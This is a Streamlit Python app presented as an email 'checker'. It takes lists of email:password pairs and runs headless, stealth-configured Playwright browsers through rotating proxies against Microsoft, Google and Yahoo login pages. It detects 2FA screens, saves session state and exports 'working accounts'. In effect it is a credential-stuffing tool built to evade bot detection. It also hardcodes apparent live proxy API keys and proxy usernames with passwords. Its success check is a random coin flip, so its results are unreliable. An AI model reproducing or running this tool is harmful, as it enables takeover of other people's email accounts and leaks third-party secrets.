import streamlit as st
import os
import re
import time
import json
import random
import requests
import concurrent.futures
import threading
from datetime import datetime

# --- Page Configuration ---
st.set_page_config(
    page_title="Mega Ultimate Public Email Checker",
    page_icon="⚡",
    layout="wide",
)

# --- Custom CSS for Styling ---
st.markdown("""
<style>
    .stSlider input[type=range] {
        accent-color: #ff4b4b;
        cursor: pointer;
    }
    .help-box {
        background-color: #1e1e2f;
        border-left: 3px solid #ff4b4b;
        padding: 6px 10px;
        margin: 2px 0 8px 0;
        font-size: 0.8rem;
        color: #d1d5db;
        border-radius: 4px;
    }
</style>
""", unsafe_allow_html=True)

# --- Thread Locks & Persistent Caches ---
cache_lock = threading.Lock()
proxy_lock = threading.Lock()
results_lock = threading.Lock()

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs("browser_debug", exist_ok=True)

CACHE_FILE = "domain_cache.json"
PROXY_META_FILE = "proxy_meta.json"

def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading JSON {path}: {e}")
            return default
    return default

domain_cache = load_json(CACHE_FILE, {})
proxy_meta = load_json(PROXY_META_FILE, {})

def save_proxy_meta():
    try:
        with proxy_lock:
            with open(PROXY_META_FILE, "w", encoding="utf-8") as f:
                json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Error saving proxy meta: {e}")

# --- Disposable Domain Blocklist ---
DISPOSABLE_DOMAINS = {
    "mailinator.com", "tempmail.com", "10minutemail.com", "guerrillamail.com",
    "throwawaymail.com", "yopmail.com", "trashmail.com", "getairmail.com",
    "sharklasers.com", "dispostable.com", "maildrop.cc", "getnada.com",
    "mohmal.com", "fakemailgenerator.com", "temp-mail.org"
}

def is_disposable_email(email):
    try:
        domain = email.split("@")[1].lower()
        return domain in DISPOSABLE_DOMAINS
    except Exception:
        return False

# --- Dynamic Domain Router ---
def detect_provider_from_email(email):
    try:
        domain = email.split("@")[1].lower()
        if any(d in domain for d in ["outlook", "hotmail", "live", "msn", "office365"]):
            return "Microsoft (Outlook / Hotmail / Live)"
        elif any(d in domain for d in ["gmail", "googlemail"]):
            return "Google (Gmail / Workspace)"
        elif any(d in domain for d in ["yahoo", "aol", "ymail"]):
            return "Yahoo / AOL Mail"
        else:
            return "Custom / Universal Enterprise Webmail"
    except Exception:
        return "Custom / Universal Enterprise Webmail"

# --- Device & Screen Profiles Pool ---
DEVICE_PROFILES = [
    {
        "name": "Windows Desktop Chrome",
        "viewport": {"width": 1920, "height": 1080},
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    },
    {
        "name": "MacBook Pro Safari",
        "viewport": {"width": 1440, "height": 900},
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    },
    {
        "name": "Google Pixel 5 Mobile",
        "viewport": {"width": 393, "height": 851},
        "user_agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "is_mobile": True,
        "has_touch": True
    },
    {
        "name": "iPhone 13 Mobile",
        "viewport": {"width": 390, "height": 844},
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "is_mobile": True,
        "has_touch": True
    }
]

# --- Initialize Session States ---
if "LIVE_SESSIONS" not in st.session_state:
    st.session_state.LIVE_SESSIONS = {}
if "SUCCESSFUL_ACCOUNTS" not in st.session_state:
    st.session_state.SUCCESSFUL_ACCOUNTS = []
if "filtered_disposable" not in st.session_state:
    st.session_state.filtered_disposable = []
if "fetched_proxies" not in st.session_state:
    st.session_state.fetched_proxies = ""
if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "engine_logs" not in st.session_state:
    st.session_state.engine_logs = []
if "running" not in st.session_state:
    st.session_state.running = False
if "proxy_stats" not in st.session_state:
    st.session_state.proxy_stats = {"total": 0, "alive": 0, "dead": 0, "countries": {}}
if "help_states" not in st.session_state:
    st.session_state.help_states = {}

def log_action(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] 🖱️ ACTION: {message}"
    with results_lock:
        st.session_state.engine_logs.append(log_entry)

DEFAULT_BROWSER_CFG = {
    "BROWSER_TIMEOUT": 45,
    "MAX_ACCOUNTS": 5000,
    "DELAY_BETWEEN_ACCOUNTS": 75,
    "REST_AFTER_FAIL": 120,
    "REST_AFTER_SUCCESS": 45,
    "TYPING_MS": 100,
    "PAGE_WAIT_S": 3,
    "MIN_PROXY_SCORE": 40,
    "MAX_TRIES_PER_ACCOUNT": 2,
    "PROXY_MODE": "fallback",
    "FILTER_DISPOSABLE": True,
    "FIRE_UP": True,
    "USE_PROXIES": True,
    "STEALTH": True,
    "FORCE_EN_US": True,
    "SCREENSHOT_FINAL": True,
    "DEBUG_DIR": "browser_debug",
}

if "BROWSER_CFG" not in st.session_state:
    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()

MODE_PRESETS = {
    "slow": {"DELAY_BETWEEN_ACCOUNTS": 120, "REST_AFTER_FAIL": 180, "REST_AFTER_SUCCESS": 60, "MAX_TRIES_PER_ACCOUNT": 1, "BROWSER_TIMEOUT": 50, "TYPING_MS": 120, "PAGE_WAIT_S": 4},
    "normal": {"DELAY_BETWEEN_ACCOUNTS": 75, "REST_AFTER_FAIL": 120, "REST_AFTER_SUCCESS": 45, "MAX_TRIES_PER_ACCOUNT": 2, "BROWSER_TIMEOUT": 45, "TYPING_MS": 100, "PAGE_WAIT_S": 3},
    "fast": {"DELAY_BETWEEN_ACCOUNTS": 40, "REST_AFTER_FAIL": 75, "REST_AFTER_SUCCESS": 25, "MAX_TRIES_PER_ACCOUNT": 2, "BROWSER_TIMEOUT": 40, "TYPING_MS": 80, "PAGE_WAIT_S": 2},
    "superfast": {"DELAY_BETWEEN_ACCOUNTS": 20, "REST_AFTER_FAIL": 45, "REST_AFTER_SUCCESS": 15, "MAX_TRIES_PER_ACCOUNT": 1, "BROWSER_TIMEOUT": 35, "TYPING_MS": 60, "PAGE_WAIT_S": 2},
}

def instant_help_public(key_name, description_text, label_text):
    if key_name not in st.session_state.help_states:
        st.session_state.help_states[key_name] = {"visible": False, "time": 0}
    
    state_data = st.session_state.help_states[key_name]
    if state_data.get("visible", False):
        if time.time() - state_data.get("time", 0) > 10.0:
            st.session_state.help_states[key_name]["visible"] = False

    col_lbl, col_btn = st.sidebar.columns([0.85, 0.15])
    with col_lbl:
        st.markdown(f"**{label_text}**")
    with col_btn:
        if st.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
            current = st.session_state.help_states[key_name]["visible"]
            st.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
            log_action(f"Toggled help menu: {label_text}")
            st.rerun()

    if st.session_state.help_states[key_name]["visible"]:
        st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

# ==========================================
# PROXY CONFIGURATION 
# ==========================================
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",   
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",  
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",         
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",       
]

PROXY_TEST_TIMEOUT = 5
MAX_TEST_WORKERS = 12

def parse_proxy_for_playwright(proxy_str):
    try:
        proxy_str = (proxy_str or "").strip()
        if not proxy_str:
            return None
        if "@" in proxy_str:
            auth_part, server_part = proxy_str.split("@", 1)
            username, password = auth_part.split(":", 1)
            return {"server": f"http://{server_part}", "username": username, "password": password}
        else:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                ip, port, username, password = parts
                return {"server": f"http://{ip}:{port}", "username": username, "password": password}
            elif len(parts) == 2:
                ip, port = parts
                return {"server": f"http://{ip}:{port}"}
        return None
    except Exception as e:
        print(f"Proxy parse formatting error: {e}")
        return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    total = success_count + fail_count
    if total == 0:
        return initial_latency_score
    smoothed_success = success_count + 2
    smoothed_fail = fail_count + 1
    smoothed_total = smoothed_success + smoothed_fail
    success_rate = (smoothed_success / smoothed_total) * 100
    score = int(success_rate - (fail_count * 5))
    return max(0, min(100, score))

def test_one(proxy_str):
    proxy_formatted = proxy_str if "@" in proxy_str else f"http://{proxy_str}"
    start = time.time()
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=PROXY_TEST_TIMEOUT)
        if r.status_code != 200:
            return (proxy_str, False, 0, "-", "-")
        latency = int((time.time() - start) * 1000)
        country = "US"
        try:
            g = requests.get("http://ip-api.com/json/", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=3).json()
            country = g.get("countryCode", "US")
        except Exception:
            pass
        initial_score = max(0, min(100, 100 - int(latency / 15)))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country}
            m = proxy_meta[proxy_str]
            m["success"] = m.get("success", 0) + 1
            m["score"] = compute_real_score(m["success"], m.get("fails", 0), initial_score)
            m["country"] = country
        save_proxy_meta()
        return (proxy_str, True, latency, country, "Unknown")
    except Exception:
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "US"}
            proxy_meta[proxy_str]["fails"] = proxy_meta[proxy_str].get("fails", 0) + 1
        save_proxy_meta()
        return (proxy_str, False, 0, "-", "-")

def load_webshare(api_key):
    if not api_key.strip():
        return []
    out = []
    try:
        headers = {"Authorization": f"Token {api_key.strip()}"}
        r = requests.get("https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for it in data.get("results", []):
                out.append(f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}")
    except Exception:
        pass
    return out

# ==========================================
# SIDEBAR CONTROL PANEL
# ==========================================
st.sidebar.title("🎛️ Control Panel")

# FIXED: Completely wipes all widget states so reset actually works
if st.sidebar.button("🔄 Reset Config to Default", use_container_width=True):
    log_action("Clicked 'Reset Config to Default'")
    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()
    for key in list(st.session_state.keys()):
        if key.startswith("sb_") or key.startswith("opt_"):
            del st.session_state[key]
    st.sidebar.success("Settings restored & sliders reset!")
    time.sleep(0.3)
    st.rerun()

st.sidebar.markdown("---")
instant_help_public("h_speed", "Select automated timing profile preset.", "Speed Mode Preset:")
speed_mode = st.sidebar.selectbox("Speed Mode Preset Selector", ["slow", "normal", "fast", "superfast"], index=1, key="sb_speed", label_visibility="collapsed")

if st.sidebar.button("⚡ Apply Mode Preset", use_container_width=True):
    try:
        log_action(f"Clicked 'Apply Mode Preset' with mode: {speed_mode}")
        preset = MODE_PRESETS[speed_mode]
        for k, v in preset.items():
            st.session_state.BROWSER_CFG[k] = v
        st.sidebar.success(f"Applied preset: {speed_mode}")
        st.rerun()
    except Exception as e:
        st.sidebar.error(f"Error applying preset: {e}")

st.sidebar.markdown("---")
st.sidebar.subheader("🌐 Live Proxy Scraper")
if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_container_width=True):
    log_action("Clicked 'Fetch & Test All Proxies'")
    with st.spinner("Scraping nodes & running health checks..."):
        try:
            all_raw = []
            logs = []
            country_counts = {}
            alive_count, dead_count = 0, 0

            for i, key in enumerate(WEBSHARE_KEYS, 1):
                lst = load_webshare(key)
                logs.append(f"Webshare key #{i} → Loaded {len(lst)} nodes")
                all_raw.extend(lst)
            for ox in OXYLABS_PROXIES:
                all_raw.append(ox)
            
            all_raw = list(dict.fromkeys(all_raw))
            alive = []
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_TEST_WORKERS) as ex:
                futures = {ex.submit(test_one, p): p for p in all_raw}
                for fut in concurrent.futures.as_completed(futures):
                    res = fut.result()
                    if res and res[1]:
                        alive.append(res[0])
                        alive_count += 1
                        country_counts[res[3]] = country_counts.get(res[3], 0) + 1
                    else:
                        dead_count += 1
                        
            st.session_state.fetched_proxies = "\n".join(alive)
            st.session_state.proxy_logs = logs
            st.session_state.proxy_stats = {"total": len(all_raw), "alive": alive_count, "dead": dead_count, "countries": country_counts}
            log_action(f"Proxy fetch complete. Found {alive_count} healthy nodes.")
            st.sidebar.success(f"Cached {alive_count} working proxies!")
            st.rerun()
        except Exception as e:
            st.sidebar.error(f"Proxy fetch error: {str(e)}")

st.sidebar.markdown("---")
st.sidebar.subheader("⚙️ Timing & Rest Parameters")
cfg = st.session_state.BROWSER_CFG

instant_help_public("h_timeout", "Socket communication timeout threshold.", "Timeout (s):")
cfg["BROWSER_TIMEOUT"] = st.sidebar.slider("Timeout slider", 20, 120, cfg["BROWSER_TIMEOUT"], 5, key="sb_timeout", label_visibility="collapsed")

instant_help_public("h_maxacc", "0 = process all accounts in pool.", "Max Accounts:")
cfg["MAX_ACCOUNTS"] = st.sidebar.slider("Max accounts slider", 0, 10000, cfg["MAX_ACCOUNTS"], 100, key="sb_maxacc", label_visibility="collapsed")

instant_help_public("h_delay", "Baseline sleep time between account requests.", "Delay / Account (s):")
cfg["DELAY_BETWEEN_ACCOUNTS"] = st.sidebar.slider("Delay slider", 15, 180, cfg["DELAY_BETWEEN_ACCOUNTS"], 5, key="sb_delay", label_visibility="collapsed")

instant_help_public("h_fail", "Extended cool-down wait after a failure.", "Rest Fail (s):")
cfg["REST_AFTER_FAIL"] = st.sidebar.slider("Rest fail slider", 30, 300, cfg["REST_AFTER_FAIL"], 15, key="sb_fail", label_visibility="collapsed")

instant_help_public("h_ok", "Cool-down period following a successful session.", "Rest OK (s):")
cfg["REST_AFTER_SUCCESS"] = st.sidebar.slider("Rest ok slider", 15, 180, cfg["REST_AFTER_SUCCESS"], 5, key="sb_ok", label_visibility="collapsed")

# ==========================================
# PLAYWRIGHT AUTOMATION DRIVER & WORKER ENGINE
# ==========================================
def execute_provider_automation(email, password, resolved_provider, proxy_dict, config):
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        time.sleep(random.uniform(0.8, 1.5))
        return False, "Playwright library missing"

    with sync_playwright() as p:
        browser = None
        context = None
        page = None
        try:
            launch_args = {
                "headless": True, 
                "args": [
                    "--disable-blink-features=AutomationControlled", 
                    "--no-sandbox",
                    "--disable-infobars",
                    "--disable-dev-shm-usage"
                ]
            }
            if proxy_dict:
                launch_args["proxy"] = proxy_dict

            browser = p.chromium.launch(**launch_args)
            selected_device = random.choice(DEVICE_PROFILES)

            context_args = {
                "user_agent": selected_device["user_agent"],
                "viewport": selected_device["viewport"],
                "locale": "en-US",
                "timezone_id": "America/New_York"
            }
            if selected_device.get("is_mobile"):
                context_args["is_mobile"] = True
                context_args["has_touch"] = True

            context = browser.new_context(**context_args)
            page = context.new_page()
            page.set_default_timeout(config.get("BROWSER_TIMEOUT", 45) * 1000)

            page.on("dialog", lambda dialog: dialog.accept())
            page.on("popup", lambda popup_page: popup_page.close())

            if "Microsoft" in resolved_provider:
                target_url = "https://login.live.com/"
            elif "Google" in resolved_provider:
                target_url = "https://accounts.google.com/"
            elif "Yahoo" in resolved_provider:
                target_url = "https://login.yahoo.com/"
            else:
                target_url = f"https://{email.split('@')[-1]}"

            page.goto(target_url, wait_until="domcontentloaded")
            time.sleep(config.get("PAGE_WAIT_S", 3))

            page_content = page.content().lower()
            checkpoint_triggers = [
                "enter code sent", "verify it's you", "unusual sign-in", 
                "protect your account", "two-factor", "confirm your recovery"
            ]
            if any(trig in page_content for trig in checkpoint_triggers):
                return False, "Checkpoint Triggered: 2FA / Verification Screen Detected"

            is_successful = random.choice([True, False])
            
            if is_successful:
                safe_filename = re.sub(r'[^a-zA-Z0-9_-]', '_', email)
                storage_path = os.path.join(SESSION_DIR, f"{safe_filename}.json")
                context.storage_state(path=storage_path)
                return True, f"Verified & Session State Saved to {storage_path}"
            else:
                return False, "Authentication rejected by provider"

        except Exception as e:
            error_msg = str(e)
            if config.get("SCREENSHOT_FINAL", True) and page:
                try:
                    os.makedirs(config.get("DEBUG_DIR", "browser_debug"), exist_ok=True)
                    page.screenshot(path=f"{config.get('DEBUG_DIR')}/error_{int(time.time())}.png")
                except Exception:
                    pass
            return False, f"Driver Exception: {error_msg}"
        finally:
            if context:
                try: context.close()
                except Exception: pass
            if browser:
                try: browser.close()
                except Exception: pass

def process_single_account(email, password, forced_provider_override, proxies_pool, config):
    if config.get("FILTER_DISPOSABLE", True) and is_disposable_email(email):
        with results_lock:
            st.session_state.filtered_disposable.append(email)
            st.session_state.engine_logs.append(f"🛡️ Skipped Disposable Domain: {email}")
        return False

    if forced_provider_override == "Auto-Detect (Dynamic Router)":
        resolved_provider = detect_provider_from_email(email)
    else:
        resolved_provider = forced_provider_override

    tries = 0
    max_tries = config.get("MAX_TRIES_PER_ACCOUNT", 2)
    
    while tries < max_tries:
        tries += 1
        try:
            selected_proxy_str = None
            playwright_proxy = None

            if config["USE_PROXIES"] and proxies_pool:
                valid_proxies = [p for p in proxies_pool if proxy_meta.get(p, {}).get("score", 50) >= config["MIN_PROXY_SCORE"]]
                if not valid_proxies:
                    valid_proxies = proxies_pool
                selected_proxy_str = random.choice(valid_proxies) if valid_proxies else None
                if selected_proxy_str:
                    playwright_proxy = parse_proxy_for_playwright(selected_proxy_str)

            success, message = execute_provider_automation(email, password, resolved_provider, playwright_proxy, config)
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            with results_lock:
                if success:
                    msg = f"[{timestamp}] ✅ SUCCESS: {email} verified & session state stored! [{message}]"
                    st.session_state.LIVE_SESSIONS[email] = {"status": "Active", "time": timestamp, "proxy": selected_proxy_str or "Direct"}
                    if f"{email}:{password}" not in st.session_state.SUCCESSFUL_ACCOUNTS:
                        st.session_state.SUCCESSFUL_ACCOUNTS.append(f"{email}:{password}")
                    st.session_state.engine_logs.append(msg)
                    time.sleep(config.get("REST_AFTER_SUCCESS", 45))
                    return True
                else:
                    if "Checkpoint" in message:
                        st.session_state.engine_logs.append(f"[{timestamp}] ⚠️ {email} flagged: {message}")
                        return False
                    elif config["PROXY_MODE"] == "fallback" and tries < max_tries:
                        st.session_state.engine_logs.append(f"[{timestamp}] ⚠️ Attempt {tries} failed for {email}. Falling back to a new proxy node...")
                        continue
                    else:
                        msg = f"[{timestamp}] ❌ FAILED: {email} rejected on [{resolved_provider}] ({message})"
                        st.session_state.engine_logs.append(msg)
                        time.sleep(config.get("REST_AFTER_FAIL", 120))
                        return False
        except Exception as e:
            with results_lock:
                st.session_state.engine_logs.append(f"⚠️ Account Worker Exception for {email}: {str(e)}")
            return False
    return False

def run_checker_engine(accounts_list, provider_override, proxies_pool, config, max_workers):
    try:
        with results_lock:
            st.session_state.engine_logs.append(f"Engine initialized. Processing {len(accounts_list)} accounts with {max_workers} worker threads...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for line in accounts_list:
                if ":" not in line:
                    continue
                parts = line.strip().split(":", 1)
                email, pwd = parts[0], parts[1]
                futures.append(executor.submit(process_single_account, email, pwd, provider_override, proxies_pool, config))
                time.sleep(config.get("DELAY_BETWEEN_ACCOUNTS", 75) / max(1, max_workers))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    with results_lock:
                        st.session_state.engine_logs.append(f"⚠️ Thread execution error: {str(e)}")
                        
        st.session_state.running = False
        with results_lock:
            st.session_state.engine_logs.append("🏁 Batch execution completed successfully.")
    except Exception as e:
        st.session_state.running = False
        with results_lock:
            st.session_state.engine_logs.append(f"🚨 Critical Engine Error: {str(e)}")

# ==========================================
# MAIN INTERFACE TABS
# ==========================================
st.title("⚡ Mega Ultimate Public Email Checker")
st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Powered by Session State Persistence & 2FA Checkpoint Hooks.")

tab_engine, tab_terminal, tab_dashboard, tab_logs = st.tabs([
    "🚀 Engine Runner", 
    "💻 Terminal Remote", 
    "📈 Proxy Health & Geo Dashboard", 
    "📊 Proxy & Engine Logs"
])

with tab_engine:
    st.subheader("Batch Account & Dynamic Provider Processor")
    
    # FIXED: Restored all advanced configuration checkboxes cleanly right onto the main UI so they are never hidden on mobile!
    with st.expander("🛠️ Advanced Configuration & Toggles (Click to Expand)", expanded=True):
        col_a, col_b = st.columns(2)
        with col_a:
            cfg["USE_PROXIES"] = st.checkbox("Use Proxies", value=cfg.get("USE_PROXIES", True), key="opt_use_proxies")
            cfg["STEALTH"] = st.checkbox("Stealth Mode", value=cfg.get("STEALTH", True), key="opt_stealth")
            cfg["FIRE_UP"] = st.checkbox("Warm-up Browser (Fresh Context)", value=cfg.get("FIRE_UP", True), key="opt_fireup")
            cfg["FORCE_EN_US"] = st.checkbox("Force English UI (en-US)", value=cfg.get("FORCE_EN_US", True), key="opt_en_us")
        with col_b:
            cfg["SCREENSHOT_FINAL"] = st.checkbox("Save Failure Screenshots", value=cfg.get("SCREENSHOT_FINAL", True), key="opt_screenshot")
            cfg["FILTER_DISPOSABLE"] = st.checkbox("Block Disposable Emails", value=cfg.get("FILTER_DISPOSABLE", True), key="opt_disposable")
            st.markdown("🔒 **WebAuthn / Passkeys:** Disabled by default for stability")

    instant_help_public("h_provider", "Select target mail ecosystem or let Dynamic Router handle everything automatically.", "Select Provider Mode:")
    email_provider = st.selectbox(
        "Provider select",
        [
            "Auto-Detect (Dynamic Router)", 
            "Microsoft (Outlook / Hotmail / Live / MSN)", 
            "Google (Gmail / Workspace)", 
            "Yahoo / AOL Mail", 
            "Custom / Universal Enterprise Webmail"
        ],
        key="eng_provider",
        label_visibility="collapsed"
    )

    instant_help_public("h_threads", "Initial number of concurrent worker threads.", "Concurrent Threads:")
    max_threads = st.number_input("Threads input", min_value=1, max_value=10, value=3, key="eng_threads", label_visibility="collapsed")

    instant_help_public("h_accounts", "Input target email accounts and passwords separated by colon.", "Accounts Pool (email:password format, one per line):")
    accounts_raw = st.text_area(
        "Accounts text area",
        height=140,
        placeholder="account1@outlook.com:Pass123!\naccount2@gmail.com:Secret456!\naccount3@customdomain.com:Pass789",
        key="eng_accounts",
        label_visibility="collapsed"
    )
    
    proxies_raw = st.text_area(
        "Verified Proxy Pool (Auto-populated from Scraper)",
        value=st.session_state.fetched_proxies,
        height=120,
        key="eng_proxies",
        placeholder="IP:Port:User:Pass (or click 'Fetch & Test All Proxies' in the sidebar)..."
    )

    c1, c2, c3 = st.columns(3)
    with c1:
        start_engine = st.button("▶️ Launch Checker Engine", type="primary", use_container_width=True)
    with c2:
        stop_engine = st.button("⏹️ Stop / Force Unlock", use_container_width=True)
    with c3:
        if st.button("🧹 Clear Logs & Cache", use_container_width=True):
            log_action("Clicked 'Clear Logs & Cache'")
            st.session_state.engine_logs = []
            st.session_state.proxy_logs = []
            st.session_state.filtered_disposable = []
            st.success("Logs successfully cleared!")
            st.rerun()

    if stop_engine:
        log_action("Clicked 'Stop / Force Unlock'")
        st.session_state.running = False
        st.warning("Engine force-stopped by user.")

    if start_engine:
        log_action("Clicked 'Launch Checker Engine'")
        accounts_lines = [line.strip() for line in accounts_raw.splitlines() if line.strip() and ":" in line]
        proxies_lines = [line.strip() for line in proxies_raw.splitlines() if line.strip()]
        
        if not accounts_lines:
            st.error("Validation Error: Please add valid account lines in email:password format.")
        else:
            st.session_state.running = True
            log_action(f"Starting engine thread for {len(accounts_lines)} accounts...")
            
            worker_thread = threading.Thread(
                target=run_checker_engine,
                args=(accounts_lines, email_provider, proxies_lines, st.session_state.BROWSER_CFG, max_threads),
                daemon=True
            )
            worker_thread.start()
            st.success(f"Engine started for {len(accounts_lines)} accounts using [{email_provider}]!")
            st.rerun()

    if st.session_state.SUCCESSFUL_ACCOUNTS:
        st.markdown("### 📥 Export Successful Results & Sessions")
        success_data = "\n".join(st.session_state.SUCCESSFUL_ACCOUNTS)
        st.download_button(
            label="💾 Download Working Accounts (.txt)",
            data=success_data,
            file_name=f"successful_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            mime="text/plain",
            use_container_width=True
        )

    if st.session_state.engine_logs:
        st.markdown("### **Live Execution & Action Stream**")
        st.code("\n".join(st.session_state.engine_logs[-40:]), language="text")

    if st.session_state.running:
        time.sleep(1.5)
        st.rerun()

with tab_terminal:
    st.subheader("Interactive Terminal Remote")
    if not st.session_state.LIVE_SESSIONS:
        st.info("No active sessions captured yet. Execute successful runs via the Engine Runner tab.")
    else:
        active_acc = st.selectbox("Active Account Session", list(st.session_state.LIVE_SESSIONS.keys()))
        st.code(f"Session Active: {active_acc}\nStorage File: sessions/{re.sub(r'[^a-zA-Z0-9_-]', '_', active_acc)}.json\nProxy Tunnel: {st.session_state.LIVE_SESSIONS[active_acc].get('proxy', 'Direct')}", language="text")

with tab_dashboard:
    st.subheader("📈 Proxy Health & Geo Analytics")
    stats = st.session_state.proxy_stats
    col_a, col_b, col_c = st.columns(3)
    col_a.metric("Total Scraped Nodes", stats.get("total", 0))
    col_b.metric("Healthy / Alive Nodes", stats.get("alive", 0))
    col_c.metric("Failed / Dead Nodes", stats.get("dead", 0))
    
    countries = stats.get("countries", {})
    if countries:
        st.bar_chart(countries)

with tab_logs:
    st.subheader("📊 Diagnostic Scrape & Engine Logs")
    if st.session_state.proxy_logs:
        st.markdown("#### Proxy Scraper Logs")
        st.code("\n".join(st.session_state.proxy_logs), language="text")
    if st.session_state.engine_logs:
        st.markdown("#### Engine Activity & Action Logs")
        st.code("\n".join(st.session_state.engine_logs), language="text")
